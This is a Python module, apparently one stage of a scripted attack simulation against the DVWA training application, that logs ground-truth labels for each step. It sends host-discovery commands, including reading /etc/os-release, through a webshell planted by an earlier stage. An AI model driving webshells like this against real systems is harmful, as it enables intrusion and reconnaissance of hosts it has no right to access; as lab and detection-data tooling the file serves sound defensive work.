"""
Stage 5 - Post-exploitation discovery via webshell (MITRE TA0007 / T1082)

Uses the webshell planted in stage 4 to run a small set of
reconnaissance-on-the-host commands. This is the "command & control /
discovery" segment of the kill chain: the attacker now has code execution
and is enumerating the compromised host before exfiltration.
"""
from attacks.dvwa_session import GroundTruth

DISCOVERY_COMMANDS = ["whoami", "id", "uname -a", "cat /etc/os-release"]


def run(dvwa_session, shell_url: str, gt: GroundTruth) -> dict:
    results = {}
    with gt.stage("c2_discovery", {"shell_url": shell_url, "commands": DISCOVERY_COMMANDS}):
        if not shell_url:
            gt.note("c2_discovery", "skipped: no webshell URL from stage 4")
            return {"results": results}
        for cmd in DISCOVERY_COMMANDS:
            r = dvwa_session.session.get(shell_url, params={"cmd": cmd}, timeout=10)
            output = r.text.strip()
            results[cmd] = output
            gt.note("c2_discovery", "command executed", command=cmd,
                    output_preview=output[:200], status=r.status_code)
    return {"results": results}


if __name__ == "__main__":
    from attacks.dvwa_session import DvwaSession
    dvwa = DvwaSession()
    dvwa.login()
    import config
    shell_url = f"{dvwa.base_url}/hackable/uploads/{config.WEBSHELL_FILENAME}"
    print(run(dvwa, shell_url, GroundTruth()))
